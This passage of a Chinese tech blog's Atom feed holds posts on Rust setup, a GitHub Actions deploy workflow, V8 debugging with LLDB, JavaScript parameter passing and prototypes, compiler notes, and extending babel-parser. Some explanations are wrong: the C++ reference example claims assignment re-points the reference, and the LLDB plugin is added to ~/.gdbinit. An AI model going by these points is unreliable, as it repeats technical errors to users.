        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincent0700.com/categories/Tech/"/>
    
    
      <category term="Javascript" scheme="https://vincent0700.com/tags/Javascript/"/>
    
      <category term="Frontend" scheme="https://vincent0700.com/tags/Frontend/"/>
    
  </entry>
  
  <entry>
    <title>Rust 语言了解一下</title>
    <link href="https://vincent0700.com/2020/08/07/064_Rust_tutorial/"/>
    <id>https://vincent0700.com/2020/08/07/064_Rust_tutorial/</id>
    <published>2020-08-07T13:00:00.000Z</published>
    <updated>2021-02-25T11:18:47.396Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>我是通过 Deno 项目了解到 Rust 线程安全和内存管理的特性，抽空粗略地整理下 Rust 相关知识。</p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><h3 id="Rust-是什么？"><a href="#Rust-是什么？" class="headerlink" title="Rust 是什么？"></a>Rust 是什么？</h3><ul><li>Rust 是一门系统级编程语言，开始由 Graydon Hoare 开发。后来 Mozilla 实验室接管了此项目。</li><li>Rust 是一种线程安全的支持并发的实用型的编程语言，支持函数式编程与命令式编程。</li><li>Rust 内存由系统统一分配管理，没有类似 malloc 这样直接的内存管理模式。</li></ul><h3 id="为什么用-Rust？"><a href="#为什么用-Rust？" class="headerlink" title="为什么用 Rust？"></a>为什么用 Rust？</h3><p>和 Java/Python/Php/C# 这类语言相比，Rust 属于系统级编程语言，相对比较底层，和 C++ 类似，执行速度快，而且解决了 C++ 编写内存安全以及多线程代码困难等问题。</p><h3 id="发行策略"><a href="#发行策略" class="headerlink" title="发行策略"></a>发行策略</h3><p>普通版本一般在 6 周左右一版，大版本周期大约 2 ~ 3 年，向下兼容，当前版本为 Rust 2018，上个版本是 Rust 2015。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="Rust-有两种安装方式"><a href="#Rust-有两种安装方式" class="headerlink" title="Rust 有两种安装方式"></a>Rust 有两种安装方式</h3><pre><code class="lang-bash">$ curl https://sh.rustup.rs -sSf | sh# or$ brew install rust</code></pre><p>查看版本</p><pre><code class="lang-bash">$ rustc -V$ cargo -V</code></pre><h3 id="Cargo-简介"><a href="#Cargo-简介" class="headerlink" title="Cargo 简介"></a>Cargo 简介</h3><p>Cargo 是 Rust 的包管理工具，正如 Npm 之与 NodeJs，Maven 之于 Java，Pypi 之于 Python，RubyGem 之于 Ruby。Cargo 做了下面这四件事：</p><ul><li>引入两个包含各种项目信息的元数据文件。</li><li>获取并构建项目的依赖项.</li><li>正确使用参数，以调用 rustc 或其他构建工具，构建你的项目。</li><li>介绍更容易使用 Rust 项目的约定 (规范 / 风格)。</li></ul><h3 id="安装-VSCode-插件"><a href="#安装-VSCode-插件" class="headerlink" title="安装 VSCode 插件"></a>安装 VSCode 插件</h3><ul><li><a href="https://marketplace.visualstudio.com/items?itemName=rust-lang.rust" target="_blank" rel="noopener">Rust语法插件</a></li><li><a href="https://marketplace.visualstudio.com/items?itemName=panicbit.cargo" target="_blank" rel="noopener">Cargo插件</a></li></ul><p>编辑 <code>.vscode/settings</code> 设置自动格式化</p><pre><code class="lang-json">{  &quot;editor.formatOnSave&quot;: true,  &quot;[rust]&quot;: {    &quot;editor.defaultFormatter&quot;: &quot;rust-lang.rust&quot;,  }}</code></pre><h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><h3 id="新建工程"><a href="#新建工程" class="headerlink" title="新建工程"></a>新建工程</h3><pre><code class="lang-bash">$ cargo new rust-test &amp;&amp; cd rust-test</code></pre><h3 id="编辑-src-main-rs"><a href="#编辑-src-main-rs" class="headerlink" title="编辑 src/main.rs"></a>编辑 <code>src/main.rs</code></h3><pre><code class="lang-rust">fn main() {  println!(&quot;Hello World!&quot;)}</code></pre><h3 id="编译执行"><a href="#编译执行" class="headerlink" title="编译执行"></a>编译执行</h3><pre><code class="lang-bash">$ rustc src/main.rs &amp;&amp; ./main# or$ cargo run</code></pre><h2 id="学习资料"><a href="#学习资料" class="headerlink" title="学习资料"></a>学习资料</h2><ol><li><a href="https://learnku.com/rust/wikis" target="_blank" rel="noopener">Rust 社区 Wiki</a></li><li><a href="https://kaisery.github.io/trpl-zh-cn/ch01-01-installation.html" target="_blank" rel="noopener">Rust 程序设计语言</a></li><li><a href="https://learnku.com/docs/rust-lang/2018" target="_blank" rel="noopener">Rust 编程语言（推荐）</a></li><li><a href="https://learnku.com/docs/cargo-book/2018" target="_blank" rel="noopener">Cargo 教程</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincent0700.com/categories/Tech/"/>
    
    
      <category term="Rust" scheme="https://vincent0700.com/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>Github Actions 踩坑</title>
    <link href="https://vincent0700.com/2020/07/29/063_Github_actions/"/>
    <id>https://vincent0700.com/2020/07/29/063_Github_actions/</id>
    <published>2020-07-29T13:00:00.000Z</published>
    <updated>2021-02-25T11:18:47.396Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>抱巨硬爸爸的大腿，把玩了几天 Github Actions 下来，感觉和 Gitlab CI 的使用方式差不多。都是通过编写 yaml 的方式在自动化 workflow 的世界里为所欲为。我觉得 Github Action 的优势在于不用写复杂的 CI/CD 脚本，只需在 <a href="https://github.com/marketplace?type=actions" target="_blank" rel="noopener">marketplace</a> 或是其他开源的仓库里寻找自己所需的工作流，然后任意组合即可实现强大功能。</p><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>下面分享一个我自己的案例，我需要实现的 workflow 是当代码提交到 <code>master</code> 分支的时候，编译打包一个 Vue 项目，然后将打包后的文件 push 到 <code>gh-pages</code> 分支。代码如下：</p><pre><code class="lang-yaml">name: Buildon:  push:    branches:      - masterjobs:  build:    if: github.repository == &#39;Vincent0700/awtrix-simulator&#39;    runs-on: ubuntu-latest    strategy:      matrix:        node-version: [12.x]    steps:      - name: Checkout repos        uses: actions/checkout@main      - name: Setup NodeJs        uses: actions/setup-node@main        with:          node-version: ${{ matrix.node-version }}      - name: Build codes        run: |          npm install          npm run build      - name: Push to gh-pages        uses: Vincent0700/git-publish-subdir-action@develop        env:          REPO: self          BRANCH: gh-pages          FOLDER: dist          GITHUB_TOKEN: ${{ secrets.REPO_ACTIONS_TOKEN }}</code></pre><p>这里需要注意的是 <code>[secrets.REPO_ACTIONS_TOKEN]</code>, 这里需要在 <a href="https://github.com/settings/tokens" target="_blank" rel="noopener">这里</a> 申请一个 Access Token，然后在项目的 Settings &gt; Secrets 中声明一个键值对 { REPO_ACTIONS_TOKEN: YOUR_TOKEN }，这样在 workflow 里就能取到你的私有变量，而不必出现在仓库代码中了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincent0700.com/categories/Tech/"/>
    
    
      <category term="Github" scheme="https://vincent0700.com/tags/Github/"/>
    
  </entry>
  
  <entry>
    <title>使用 LLDB 调试 V8</title>
    <link href="https://vincent0700.com/2020/07/14/062_V8_debug/"/>
    <id>https://vincent0700.com/2020/07/14/062_V8_debug/</id>
    <published>2020-07-14T13:00:00.000Z</published>
    <updated>2021-02-25T11:18:47.395Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="编译-V8"><a href="#编译-V8" class="headerlink" title="编译 V8"></a>编译 V8</h2><p>这里编译 debug 版本，我这里用的 V8 版本是 8.3.110.9 (8.3-lkgr)</p><pre><code class="lang-bash">$ v8gen.py x64.debug$ ninja -C out.gn/x64.debug</code></pre><p>如果对 V8 编译不熟悉可以参考我之前的文章<a href="/2020/05/18/054_V8_compilation/">《V8 编译踩坑》</a></p><h2 id="d8-常用的运行参数"><a href="#d8-常用的运行参数" class="headerlink" title="d8 常用的运行参数"></a>d8 常用的运行参数</h2><h3 id="使用运行时函数进行调试"><a href="#使用运行时函数进行调试" class="headerlink" title="使用运行时函数进行调试"></a>使用运行时函数进行调试</h3><pre><code class="lang-js">//test.jsvar a = [1,2,3];%DebugPrint(a); // 打印调试信息%SystemBreak(); // 下断点</code></pre><pre><code class="lang-bash">$ ./d8 test.js --allow-natives-syntaxDebugPrint: 0x466080c5879: [JSArray] - map: 0x046608281409 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties] - prototype: 0x046608248251 &lt;JSArray[0]&gt; - elements: 0x04660824ef2d &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)] - length: 3 - properties: 0x0466080406e9 &lt;FixedArray[0]&gt; {    #length: 0x0466081c0165 &lt;AccessorInfo&gt; (const accessor descriptor) } - elements: 0x04660824ef2d &lt;FixedArray[3]&gt; {           0: 1           1: 2           2: 3 }0x46608281409: [Map] - type: JS_ARRAY_TYPE - instance size: 16 - inobject properties: 0 - elements kind: PACKED_SMI_ELEMENTS - unused property fields: 0 - enum length: invalid - back pointer: 0x04660804030d &lt;undefined&gt; - prototype_validity cell: 0x0466081c0451 &lt;Cell value= 1&gt; - instance descriptors #1: 0x0466082488d9 &lt;DescriptorArray[1]&gt; - transitions #1: 0x0466082488f5 &lt;TransitionArray[4]&gt;Transition array #1:     0x0466080425c9 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_SMI_ELEMENTS) -&gt; 0x046608281481 &lt;Map(HOLEY_SMI_ELEMENTS)&gt; - prototype: 0x046608248251 &lt;JSArray[0]&gt; - constructor: 0x046608248125 &lt;JSFunction Array (sfi = 0x466081cb321)&gt; - dependent code: 0x0466080401ed &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt; - construction counter: 0[1]    75260 trace trap  ./d8 test.js --allow-natives-syntax</code></pre><h3 id="查看-Ignition-生成的字节码"><a href="#查看-Ignition-生成的字节码" class="headerlink" title="查看 Ignition 生成的字节码"></a>查看 Ignition 生成的字节码</h3><pre><code class="lang-js">// test2.jsconst a = [1,2,3]const b = &quot;123&quot;</code></pre><pre><code class="lang-bash">$ ./d8 test2.js --print-bytecode[generated bytecode for function:  (0x0f0c0824eee9 &lt;SharedFunctionInfo&gt;)]Parameter count 1Register count 1Frame size 8         0xf0c0824ef6a @    0 : 7a 00 00 25       CreateArrayLiteral [0], [0], #37         0xf0c0824ef6e @    4 : 1d 02             StaCurrentContextSlot [2]         0xf0c0824ef70 @    6 : 12 01             LdaConstant [1]         0xf0c0824ef72 @    8 : 1d 03             StaCurrentContextSlot [3]         0xf0c0824ef74 @   10 : 0d                LdaUndefined         0xf0c0824ef75 @   11 : aa                ReturnConstant pool (size = 2)0xf0c0824ef39: [FixedArray] in OldSpace - map: 0x0f0c080404b1 &lt;Map&gt; - length: 2           0: 0x0f0c0824ef25 &lt;ArrayBoilerplateDescription PACKED_SMI_ELEMENTS, 0x0f0c0824ef11 &lt;FixedArray[3]&gt;&gt;           1: 0x0f0c0824eea5 &lt;String[#3]: 123&gt;Handler Table (size = 0)Source Position Table (size = 0)</code></pre><p>可以看出变量 a 数组 [1,2,3] 存放在地址为 0xf0c0824ef39 的老生带里</p><h3 id="跟踪-TurboFan-的优化操作"><a href="#跟踪-TurboFan-的优化操作" class="headerlink" title="跟踪 TurboFan 的优化操作"></a>跟踪 TurboFan 的优化操作</h3><pre><code class="lang-js">// test3.jsfunction add(a, b) {  return a + b;}for (let i = 0; i &lt; 10000; i++) {  add(1,2)}</code></pre><pre><code class="lang-bash">$ ./d8 test3.js --trace-opt --trace-deopt[marking 0x0e660824f011 &lt;JSFunction (sfi = 0xe660824eef9)&gt; for optimized recompilation, reason: small function][compiling method 0x0e660824f011 &lt;JSFunction (sfi = 0xe660824eef9)&gt; using TurboFan OSR][optimizing 0x0e660824f011 &lt;JSFunction (sfi = 0xe660824eef9)&gt; - took 10.606, 9.730, 0.427 ms]</code></pre><p>我修改循环的最大值，发现直到 i &gt; 10000 的时候 TurboFan 开始编译函数进行优化</p><h2 id="配置-LLDB"><a href="#配置-LLDB" class="headerlink" title="配置 LLDB"></a>配置 LLDB</h2><p>在 V8 的源码里找到这个 plugin</p><pre><code class="lang-bash">$ ll | grep lldb-rw-r--r--   1 Vincent  staff   3.9K May 14 14:42 lldb_commands.py</code></pre><p>添加到 HOME 目录下 gdb 的启动脚本中</p><pre><code class="lang-bash">$ echo &#39;source /path/to/lldb_commands.py&#39; &gt;&gt; ~/.gdbinit</code></pre><h2 id="使用-LLDB-进行调试"><a href="#使用-LLDB-进行调试" class="headerlink" title="使用 LLDB 进行调试"></a>使用 LLDB 进行调试</h2><pre><code class="lang-bash">$ lldb ./d8 -- --allow-natives-syntax ./test.js(lldb) target create &quot;./d8&quot;Current executable set to &#39;./d8&#39; (x86_64).(lldb) settings set -- target.run-args  &quot;--allow-natives-syntax&quot; &quot;./test.js&quot;(lldb) rProcess 99948 launched: &#39;/Users/Vincent/Common/v8/out.gn/x64.debug/d8&#39; (x86_64)DebugPrint: 0x2e34080c5815: [JSArray]...</code></pre><p>找到断点处变量 a 的地址是 0x2e34080c5815，我们可以用刚才添加的 lldb_commands.py 插件中的 job 指令查看 JSArray 在内存中的数据结构</p><pre><code class="lang-bash">(lldb) job 0x2e34080c58150x2e34080c5815: [JSArray] - map: 0x2e3408281409 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties] - prototype: 0x2e3408248251 &lt;JSArray[0]&gt; - elements: 0x2e340824ef2d &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)] - length: 3 - properties: 0x2e34080406e9 &lt;FixedArray[0]&gt; {    #length: 0x2e34081c0165 &lt;AccessorInfo&gt; (const accessor descriptor) } - elements: 0x2e340824ef2d &lt;FixedArray[3]&gt; {           0: 1           1: 2           2: 3 }</code></pre><p>我们发现数组的数据是存储在 FixedArray 对象中，继续查看一下</p><pre><code class="lang-bash">(lldb) job 0x2e340824ef2d0x2e340824ef2d: [FixedArray] in OldSpace - map: 0x2e34080404d9 &lt;Map&gt; - length: 3           0: 1           1: 2           2: 3</code></pre><p>更多 V8 调试技巧后续更新</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincent0700.com/categories/Tech/"/>
    
    
      <category term="FrontEnd" scheme="https://vincent0700.com/tags/FrontEnd/"/>
    
      <category term="V8" scheme="https://vincent0700.com/tags/V8/"/>
    
  </entry>
  
  <entry>
    <title>Javascript 参数传递方式</title>
    <link href="https://vincent0700.com/2020/06/24/061_Javascript_parameters/"/>
    <id>https://vincent0700.com/2020/06/24/061_Javascript_parameters/</id>
    <published>2020-06-24T13:00:00.000Z</published>
    <updated>2021-02-25T11:18:47.395Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="三种参数传递方式"><a href="#三种参数传递方式" class="headerlink" title="三种参数传递方式"></a>三种参数传递方式</h2><h3 id="1-值传递"><a href="#1-值传递" class="headerlink" title="1. 值传递"></a>1. 值传递</h3><p>将参数的值完全复制一份，按值传递。特征：对于传递过来的变量进行修改，不会影响到原变量。</p><h3 id="2-引用传递"><a href="#2-引用传递" class="headerlink" title="2. 引用传递"></a>2. 引用传递</h3><p>对于参数的完全引用传递。特征：无论是对于变量成员的修改，还是对变量重新赋值，都会影响到原对象。例如：</p><pre><code class="lang-c++">// C++#include &quot;stdio.h&quot;class People {public:  int age;  People(int age): age(age) {}};void fun(People&amp; p) {  p.age = 10;  People p2(20);  p = p2;}int main() {  People p(5);  fun(p);  printf(&quot;%d&quot;, p.age); // 20  return 0;}</code></pre><p>这里返回了20，说明 <code>p = p2</code> 改变了外部参数引用指向的地址，说明 C++ 是完全的引用传递。</p><h3 id="3-引用复制"><a href="#3-引用复制" class="headerlink" title="3. 引用复制"></a>3. 引用复制</h3><p>将参数的地址复制一份，按值传递地址。特征：对于变量的成员进行修改时，会直接影响原变量；而如果对传递过来的变量进行重新赋值，则不会影响原变量，并且此后再修改变量的成员，也不会影响原变量。例如：</p><pre><code class="lang-js">// javascriptfunction fun(p) {  p.age = 10;  p = { age: 20 };}let p = { age: 5 };fun(p);console.log(p.age); // 10</code></pre><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>所以 Javascript 的参数传递方式是</p><ol><li>基本数据类型 -&gt; 值传递</li><li>复杂数据类型 -&gt; 引用复制 （也有书中写的是值传递，但含义相同）</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincent0700.com/categories/Tech/"/>
    
    
      <category term="FrontEnd" scheme="https://vincent0700.com/tags/FrontEnd/"/>
    
      <category term="Javascript" scheme="https://vincent0700.com/tags/Javascript/"/>
    
  </entry>
  
  <entry>
    <title>Javascript 原型总结</title>
    <link href="https://vincent0700.com/2020/06/23/060_Javascript_prototype/"/>
    <id>https://vincent0700.com/2020/06/23/060_Javascript_prototype/</id>
    <published>2020-06-23T13:00:00.000Z</published>
    <updated>2021-02-25T11:18:47.395Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a><code>prototype</code></h2><p>prototype 是一个显式声明的原型属性，只有函数拥有，除了通过 <code>bind</code> 创建的函数。默认它只有一个属性 constructor 指向构造函数，即：</p><pre><code class="lang-js">const fun = function() {}fun.prototype.constructor === fun // true</code></pre><h2 id="proto"><a href="#proto" class="headerlink" title="__proto__"></a><code>__proto__</code></h2><p>每个对象都有一个 <code>__proto__</code> 属性，指向它构造函数的原型，即：</p><pre><code class="lang-js">function Fun() {}const fun = new Fun();fun.__proto__ === Fun.prototype;</code></pre><h2 id="函数对象？"><a href="#函数对象？" class="headerlink" title="函数对象？"></a>函数对象？</h2><p>函数对象与其他用户所定义的对象有着本质的区别，这一类对象被称之为内部对象，例如：</p><ul><li>Function</li><li>Object</li><li>Array</li><li>String</li><li>Number</li><li>RegExp</li><li>Date</li></ul><p>这些内置对象的构造器是由 JavaScript 本身所定义的，通过 <code>[native code]</code> 来初始化返回的对象，而不是由用户来指定对象的构造方式。</p><pre><code class="lang-js">Array.__proto__// f() { [native code] }Object.__proto__// f() { [native code] }Function.__proto__// f() { [native code] }</code></pre><h2 id="Function-和-Object"><a href="#Function-和-Object" class="headerlink" title="Function 和 Object"></a>Function 和 Object</h2><p>函数对象都是 Function 自身的实例</p><pre><code class="lang-js">Function.__proto__ === Function.prototypeObject.__proto__ === Function.prototype</code></pre><p>同时 Function 也继承自 Object</p><pre><code class="lang-js">Function.__proto__.__proto__ === Object.prototypeArray instanceof Object // true</code></pre><p>原型链的终点是 null</p><pre><code class="lang-js">Object.prototype.__proto__ === null</code></pre><p>关于原型链的一切看这张图就好了</p><p><img src="https://www.ibm.com/developerworks/cn/web/1306_jiangjj_jsinstanceof/figure1.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincent0700.com/categories/Tech/"/>
    
    
      <category term="FrontEnd" scheme="https://vincent0700.com/tags/FrontEnd/"/>
    
      <category term="Javascript" scheme="https://vincent0700.com/tags/Javascript/"/>
    
  </entry>
  
  <entry>
    <title>编译原理 学习笔记</title>
    <link href="https://vincent0700.com/2020/06/11/059_Compilation_principle/"/>
    <id>https://vincent0700.com/2020/06/11/059_Compilation_principle/</id>
    <published>2020-06-11T13:00:00.000Z</published>
    <updated>2021-03-06T02:54:47.808Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>因为最近跟 Babel 打交道比较多，虽然通过自定义 Babel 插件以及魔改 babel-parser 等方式能够达到随心所欲地修改 Javascript 语法树的目的，但是对于解释器的实现本身缺少系统性的认知。大学的时候学习过编译原理这门课，也用 C++ 实现过简易版的 mips 汇编器。最近打算再填新坑，重读 《编译原理 第二版》，构建完整性的知识体系。</p></blockquote><h2 id="第一章-引论"><a href="#第一章-引论" class="headerlink" title="第一章 引论"></a>第一章 引论</h2><h3 id="1-1-语言处理器"><a href="#1-1-语言处理器" class="headerlink" title="1.1 语言处理器"></a>1.1 语言处理器</h3><ul><li>编译器(compiler):<br>源程序 -&gt; [编译器] -&gt; 目标程序<br>输入 -&gt; [目标程序] -&gt; 输出</li><li>解释器(interpreter): (源程序 + 输入) -&gt; [解释器] -&gt; 输出</li><li>预处理器(preprocessor): 聚合源程序，将宏转化为源语言的语句</li><li>汇编器(assembler): 生成机器码</li><li>链接器: 解析未定义的符号引用，将目标文件中的占位符替换为符号的地址</li></ul><h3 id="1-2-一个编译器的结构"><a href="#1-2-一个编译器的结构" class="headerlink" title="1.2 一个编译器的结构"></a>1.2 一个编译器的结构</h3><p>字符流 -&gt; [词法分析器]-&gt;<br>符号流 -&gt; [词法分析] -&gt;<br>语法树 -&gt; [语义分析] -&gt;<br>语法树 -&gt; [中间代码生成器] -&gt;<br>中间表示形式 -&gt; [机器无关代码优化器] -&gt;<br>中间表示形式 -&gt; [代码生成器] -&gt;<br>目标机器语言 -&gt; [机器相关代码优化器] -&gt;<br>目标机器语言</p><h2 id="第三章-词法分析"><a href="#第三章-词法分析" class="headerlink" title="第三章 词法分析"></a>第三章 词法分析</h2><h3 id="3-1-词法分析器的作用"><a href="#3-1-词法分析器的作用" class="headerlink" title="3.1 词法分析器的作用"></a>3.1 词法分析器的作用</h3><ol><li>识别词素，生成词法单元</li><li>过滤注释和分隔符</li><li>将编译器生成的错误信息与源程序位置联系起来</li><li>如果使用宏预处理器，则可以负责完成宏的扩展</li></ol><img src="/2020/06/11/059_Compilation_principle/3.1.png"><p>示例：</p><div class="table-container"><table><thead><tr><th>词法单元</th><th>非正式描述</th><th>词素示例</th></tr></thead><tbody><tr><td>if</td><td>字符 i, f</td><td>if</td></tr><tr><td>id</td><td>字幕开头的数字 / 字符串</td><td>pi, score, D2</td></tr><tr><td>number</td><td>任何数字常量</td><td>3.14159, 0, 6.02e23</td></tr><tr><td>literal</td><td>在引号之间的部分</td><td>“hello world”</td></tr></tbody></table></div><p>词法分析器很难发现源代码中的错误，需要在语法分析阶段去处理。<br>当所有词法单元的模式都无法匹配剩余输入匹配的时候，就不能继续处理输入了，最简单恢复策略就是”恐慌模式“，我们从剩余的输入中不断删除字符，直到能够在剩余输入的开头发现一个正确的词法单元为之。</p><h3 id="3-4-词法单元的识别"><a href="#3-4-词法单元的识别" class="headerlink" title="3.4 词法单元的识别"></a>3.4 词法单元的识别</h3><p>首先构造状态转换图，例如比较运算符 relop 的状态转换图如下：</p><img src="/2020/06/11/059_Compilation_principle/3.13.png"><p>如何区分标识符和保留字：</p><ol><li>先将保留字存入符号表，找到一个标识符时，如果它未出现在符号表中，就调用 installID 将该标识符放入符号表，它的词法单元是 ID，否则调用 getToken 查看符号表，要么是之前存入的 ID，要么是保留字。</li><li>为每个关键字建立单独的状态转换图，但是用这种方法需要确定词法单元之间的优先级。git</li></ol><h3 id="未完待续-…"><a href="#未完待续-…" class="headerlink" title="未完待续 …"></a>未完待续 …</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Tech" scheme="https://vincent0700.com/categories/Tech/"/>
    
    
      <category term="Compiler" scheme="https://vincent0700.com/tags/Compiler/"/>
    
  </entry>
  
  <entry>
    <title>魔改 babel-parser 实现自定义 JS 语法</title>
    <link href="https://vincent0700.com/2020/06/09/058_Babel_custom_grammar/"/>
    <id>https://vincent0700.com/2020/06/09/058_Babel_custom_grammar/</id>
    <published>2020-06-09T13:00:00.000Z</published>
    <updated>2020-06-12T23:53:07.198Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>上篇文章 <a href="/2020/06/04/057_Babel_plugin/">《自己动手撸一个 Babel 插件》</a> 讲述了如何构造 Babel 插件修改 JS 语法树，这篇文章将通过调试并魔改 babel-parser 源码来实现任何自定义的 JS 语法。</p></blockquote><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>如果对 Babel 项目不太熟悉的同学可以先阅读下面两篇文章，下面这篇是上面的译文 + 学习笔记。这两篇文章给了我很大启发，后面我也将从自己亲身实践的一个案例入手，不断深入 Babel 的魔法世界。</p><ul><li><a href="https://lihautan.com/creating-custom-javascript-syntax-with-babel/" target="_blank" rel="noopener">Creating custom JavaScript syntax with Babel</a></li><li><a href="https://segmentfault.com/a/1190000020608635" target="_blank" rel="noopener">精读《用 Babel 创造自定义 JS 语法》</a></li></ul><p>如果对 AST 节点定义不了解的，可以参考我之前的文章 <a href="/2020/05/27/056_Javascript_ast/">JS 语法树学习（全）</a></p><h2 id="一个想法"><a href="#一个想法" class="headerlink" title="一个想法"></a>一个想法</h2><p>一直觉得 Python 的 list 语法设计的是真的好用，和 JS 的 Array 对比一下：</p><pre><code class="lang-js">// pythona = [x for x in range(10)]// javascriptconst a = Array(10).fill(0).map((item, index) =&gt; index)</code></pre><pre><code class="lang-js">// python[1,2,3,4,5][1:3]// javascript[1,2,3,4,5].slice(1,3)</code></pre><p>有没有觉得 Python 写起来更简洁一些，但是像 Python 这样的切片表达式不符合 Javascript AST 规范，你可以在 <a href="https://lihautan.com/babel-ast-explorer/" target="_blank" rel="noopener">Babel AST Explorer</a> 查看结果。</p><img src="/2020/06/09/058_Babel_custom_grammar/astexplorer.png"><p>我们看到 babel-parser 无法解析这样的数组切片语法，因此我们无法通过 Babel 插件实现从 <code>a[1:3]</code> 到 <code>a.slice(1,3)</code> 的转化。</p><h2 id="从-Babel-源码入手"><a href="#从-Babel-源码入手" class="headerlink" title="从 Babel 源码入手"></a>从 Babel 源码入手</h2><p>首先 fork Babel 源码，并 Clone 到本地，执行 make bootstrap &amp;&amp; make build。如果对 Babel 源码结构不了解的童鞋可以看上面提到的两篇文章。然后在项目路径新建 packages/babel-parser/test.js</p><pre><code class="lang-js">const { parse } = require(&quot;./lib&quot;);parse(`a[1:3]`, { sourceType: &quot;module&quot; });</code></pre><p>执行 <code>node test.js</code>，发现报错与刚才网页上的一致：</p><pre><code class="lang-js">SyntaxError: Unexpected token, expected &quot;]&quot; (1:3)    at Parser._raise (/Users/Vincent/Playground/babel/packages/babel-parser/lib/index.js:747:17)    at Parser.raiseWithData (/Users/Vincent/Playground/babel/packages/babel-parser/lib/index.js:740:17)    at Parser.raise (/Users/Vincent/Playground/babel/packages/babel-parser/lib/index.js:734:17)    at Parser.unexpected (/Users/Vincent/Playground/babel/packages/babel-parser/lib/index.js:8812:16)    at Parser.expect (/Users/Vincent/Playground/babel/packages/babel-parser/lib/index.js:8798:28)    at Parser.parseSubscript (/Users/Vincent/Playground/babel/packages/babel-parser/lib/index.js:9743:14)    at Parser.parseSubscripts (/Users/Vincent/Playground/babel/packages/babel-parser/lib/index.js:9696:19)    at Parser.parseExprSubscripts (/Users/Vincent/Playground/babel/packages/babel-parser/lib/index.js:9679:17)    at Parser.parseMaybeUnary (/Users/Vincent/Playground/babel/packages/babel-parser/lib/index.js:9653:21)    at Parser.parseExprOps (/Users/Vincent/Playground/babel/packages/babel-parser/lib/index.js:9523:23) {  loc: Position { line: 1, column: 3 },  pos: 3}</code></pre><h3 id="VSCode-配置"><a href="#VSCode-配置" class="headerlink" title="VSCode 配置"></a>VSCode 配置</h3><p>安装插件：</p><ul><li>vscode-flow-ide</li><li>ESLint</li></ul><p>新建 .vscode/settings.json，开启 